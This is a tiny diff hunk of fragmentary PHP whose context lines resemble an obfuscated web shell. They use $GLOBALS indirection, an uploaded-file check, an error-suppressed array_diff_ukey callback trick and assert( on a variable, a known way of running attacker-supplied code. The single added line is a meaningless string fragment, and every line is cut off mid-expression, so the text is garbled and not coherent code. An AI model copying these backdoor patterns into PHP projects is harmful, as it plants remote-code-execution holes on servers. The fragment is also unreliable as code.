@@ -40,3 +40,4 @@ foreach ($GLOBALS[$GLOBALS['
 '])){if(is_uploaded_file($_
 <?php @array_diff_ukey(@array((
 "; assert($
+:"")."//");
